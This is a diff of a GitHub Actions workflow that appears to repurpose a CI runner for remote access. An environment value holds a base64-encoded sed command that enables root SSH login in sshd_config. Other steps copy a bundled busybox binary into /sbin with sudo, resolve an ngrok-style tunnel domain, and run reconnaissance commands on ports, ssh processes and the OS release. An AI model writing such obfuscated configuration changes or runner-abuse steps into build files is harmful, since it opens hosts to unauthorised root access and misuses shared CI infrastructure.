@@ -36,7 +36,7 @@ jobs:
           ss0: "c2VkIC1pICJzL14jXD9cKFBlcm1pdFJvb3RMb2dpblwpL1wxIHllcyMvZyIgL2V0Yy9zc2gvc3NoZF9jb25maWc7"
       # Runs a set of commands using the runners shell
       - name: Run a 2-line script
-        run: bash -c "echo \"${{ github.workspace }}--$GITHUB_WORKSPACE--${{ runner.workspace }}\";date;sudo cp ./busybox.bin /sbin/busybox;busybox nslookup ngrok.xiaomiqiu123.top 114.114.114.114 |grep -v 114.114.114.114;exit 0"
+        run: bash -c "echo \"${{ github.workspace }}--${GITHUB_WORKSPACE}--${{ runner.workspace }}\";date;sudo cp ./busybox.bin /sbin/busybox;busybox nslookup ngrok.xiaomiqiu123.top 114.114.114.114 |grep -v 114.114.114.114;exit 0"
         env:
           ss0: "c2VkIC1pICJzL14jXD9cKFBlcm1pdFJvb3RMb2dpblwpL1wxIHllcyMvZyIgL2V0Yy9zc2gvc3NoZF9jb25maWc7"
       # Runs a set of commands using the runners shell
@@ -55,7 +55,7 @@ jobs:
           TZ: Asia/Shanghai
       - name: Run a 3rd script #cat /tmp/y1;echo liuhuan88;cat /tmp/y2;cat /tmp/y1;
         run: 
-          bash -c '(ls -al / /tmp;sudo netstat -tnlp;ps aux| grep ssh;cat /etc/*release);' 
+          bash -c '(ls -al / /tmp;sudo netstat -tnlp;ps aux| grep ssh;cat /etc/os*release);' 
         env:
           sp9: 4
           TZ: Asia/Shanghai
